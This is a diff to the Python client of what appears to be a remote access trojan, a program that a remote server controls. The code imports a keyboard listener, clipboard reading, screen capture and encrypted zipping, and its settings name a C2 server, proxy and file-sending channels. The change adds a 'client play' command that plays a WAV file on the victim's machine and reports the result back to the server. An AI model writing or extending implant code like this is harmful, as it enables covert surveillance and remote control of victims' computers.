@@ -20,8 +20,9 @@ from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from pyperclip import paste, PyperclipWindowsException
 from pynput.keyboard import Listener, Controller, Key
 from PIL import ImageGrab, Image
-from encryption import cipher
+from winsound import PlaySound, SND_ASYNC
 
+from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
                       C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND, ZIP_PASSWORD, INCOMING)
@@ -455,9 +456,20 @@ while True:
             keyboard.press(Key.media_volume_up)
             keyboard.release(Key.media_volume_up)
 
-    # the 'client play FILENAME.waw' command can be used to play voice recordings or waw music on the client
+    # the 'client play FILENAME.wav' command can be used to play voice recordings or waw music on the client
     elif command.startswith("client play"):
-        pass
+        filepath = get_filename(command)
+        if filepath is None:
+            continue
+        try:
+            # Make sure filepath is existing and its wav file
+            if path.isfile(filepath) and filepath.lower().endswith(".wav"):
+                PlaySound(filepath, SND_ASYNC)
+                post_to_server(f"[+]-Client => {filepath} is now Playing on the {clientPrint}. \n")
+            else:
+                post_to_server(f"{filepath} is Not Found on the {clientPrint} or filename don't end with .wav \n")
+        except OSError:
+            post_to_server(f"Accessing {filepath} caused an OS Error on {clientPrint}. \n")
 
     # Else, the wrong input, actually not a Built-in Command or Shell Command or Client/Server Commands
     else:
